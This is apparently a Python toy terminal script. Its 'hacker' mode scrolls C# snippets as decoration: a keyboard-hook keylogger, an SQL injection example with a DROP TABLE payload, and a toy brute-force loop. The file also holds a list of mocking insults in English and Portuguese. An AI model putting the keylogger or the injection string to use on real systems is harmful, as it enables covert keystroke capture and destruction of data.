import random
import sys
import time
from common import console

def fast_print(text, delay_time):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay_time)  

hacker_display = ['''using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

class KeyLogger
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Main()
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
        return CallNextHookEx(_hookID, nCode, wParam, lParam);

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);''',
    '''
    using System;
using System.Data.SqlClient;

class SQLInjectionExample
{
    static void Main(string[] args)
    {
        string userInput = "'; DROP TABLE Users; --"; // Input malicioso
        string query = $"SELECT * FROM Users WHERE Username = '{userInput}'";

        using (SqlConnection connection = new SqlConnection("Data Source=server;Initial Catalog=database;Integrated Security=True"))
        {
            SqlCommand command = new SqlCommand(query, connection);
            connection.Open();

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Console.WriteLine(reader["Username"]);
                }
            }
            catch (SqlException ex)
            {
                Console.WriteLine("Erro ao executar a consulta: " + ex.Message);
            }
        }
    }
}
''', 
'''
using System;
using System.Data.SqlClient;

class SQLInjectionExample
{
    static void Main(string[] args)
    {
        string userInput = "'; DROP TABLE Users; --"; // Input malicioso
        string query = $"SELECT * FROM Users WHERE Username = '{userInput}'";

        using (SqlConnection connection = new SqlConnection("Data Source=server;Initial Catalog=database;Integrated Security=True"))
        {
            SqlCommand command = new SqlCommand(query, connection);
            connection.Open();

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    Console.WriteLine(reader["Username"]);
                }
            }
            catch (SqlException ex)
            {
                Console.WriteLine("Erro ao executar a consulta: " + ex.Message);
            }
        }
    }
}
''', 
'''
using System;
using System.Diagnostics;
using System.Threading.Tasks;

class BruteForce
{
    static async Task Main(string[] args)
    {
        string targetPassword = "1234";
        char[] chars = "0123456789".ToCharArray();

        foreach (var password in GeneratePasswords(chars, 4))
        {
            if (password == targetPassword)
            {
                Console.WriteLine($"Senha encontrada: {password}");
                break;
            }
            await Task.Delay(10); // Simula o tempo de tentativa
        }
    }

    static IEnumerable<string> GeneratePasswords(char[] chars, int length)
    {
        if (length == 1)
        {
            foreach (var c in chars)
            {
                yield return c.ToString();
            }
        }
        else
        {
            foreach (var c in chars)
            {
                foreach (var suffix in GeneratePasswords(chars, length - 1))
                {
                    yield return c + suffix;
                }
            }
        }
    }
}

''',
'''
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

class KeyLogger
{
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Main()
    {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}

''']
insults_in_english = [
    "Bro, you are so fat, so fat, so fat, so fat, that I can keep repeating this over and over again just to tell you how fat you are",
    "Hey guy, did you know that you jump, you make a earthquake on the other side of the world?",
    "You are so ugly, that when you look in the mirror, the mirror creates life just to kill yourself",
    "You are so small, that when you were born, the doctors thought you were born prematurely",
    "You're so boring, even your reflection in the mirror rolls its eyes at you.",
    "You're so clueless, Google had to create a search just to figure out what’s wrong with you.",
]
insults_in_portuguese = [
    "Você é tão feio que até o espelho chora quando te vê.",
    "Você é tão chato que até seu reflexo boceja quando te vê.",
    "Você é tão pequeno que te confundiram com um chaveiro.",
    "Você é tão burro que tentou colocar o cinto de segurança em um ônibus escolar."
]

def insult():
    print("Put your language here (We have just English and Portuguese insults): ")
    language = input("> ").upper()
    if language == "ENGLISH":
        choice = random.choice(insults_in_english)
        console.print(f"[red]{choice}[/red]")
    elif language == "PORTUGUESE":
        choice = random.choice(insults_in_portuguese)
        console.print(f"[red]{choice}[/red]")
    else:
        console.print(f"Sorry, but the creator of this terminal doesn't know {language} or he is making an insult with this language.")

def hacker():
    random_choice = random.choice(hacker_display)
    fast_print(random_choice, 0.005)
